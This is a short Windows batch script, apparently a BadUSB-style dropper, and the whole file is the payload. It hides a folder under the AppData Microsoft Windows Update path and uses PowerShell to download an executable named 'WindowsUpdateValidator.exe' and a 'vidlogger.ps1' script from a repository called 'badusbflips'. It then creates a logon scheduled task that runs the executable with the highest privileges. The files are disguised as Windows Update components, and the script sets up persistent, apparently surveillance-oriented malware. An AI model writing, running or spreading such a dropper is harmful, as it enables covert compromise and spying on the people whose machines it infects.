@echo off
set TEMP_PATH=%APPDATA%\Microsoft\Windows\Update
mkdir "%TEMP_PATH%" >nul 2>&1

REM Download the main EXE
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/DarknesGX/badusbflips/main/WindowsUpdateValidator.exe -OutFile '%TEMP_PATH%\WindowsUpdateValidator.exe'"

REM Download vidlogger.ps1 separately (optional for future dynamic use or debugging)
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/DarknesGX/badusbflips/main/vidlogger.ps1 -OutFile '%TEMP_PATH%\vidlogger.ps1'"

REM Register persistent scheduled task
schtasks /create /f /tn "Windows Update Validator" /tr "\"%TEMP_PATH%\WindowsUpdateValidator.exe\"" /sc onlogon /rl highest